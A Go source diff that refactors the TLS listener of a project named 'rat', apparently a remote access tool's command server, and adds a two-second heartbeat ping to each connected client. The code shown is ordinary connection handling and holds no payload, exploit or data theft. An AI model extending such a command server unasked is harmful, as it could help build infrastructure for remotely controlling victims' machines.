@@ -1,15 +1,14 @@
-package networking
+package main
 
 import (
 	"crypto/tls"
 	"fmt"
-	"rat/command/client"
-	"rat/command/packets/incoming"
+	"time"
 )
 
 var (
 	// Clients are all connected clients to this server
-	Clients []*client.Client
+	Clients []*Client
 )
 
 type Server struct {
@@ -29,14 +28,15 @@ func Listen(server *Server) error {
 			continue
 		}
 
-		var client client.Client
+		var client Client
 		client.Conn = conn
 		Clients = append(Clients, &client)
 		go handleClient(&client)
+		go heartbeat(&client)
 	}
 }
 
-func handleClient(client *client.Client) {
+func handleClient(client *Client) {
 	for {
 		header, err := client.ReadHeader()
 
@@ -44,11 +44,18 @@ func handleClient(client *client.Client) {
 			break
 		}
 
-		packet := incoming.GetPacket(header)
+		packet := GetIncomingPacket(header)
 		err = packet.Read(client)
 
 		if err != nil {
 			break
 		}
+	}
+}
+
+func heartbeat(client *Client) {
+	for {
+		time.Sleep(time.Second * 2)
+		client.WritePacket(Ping{})
 	}
 }
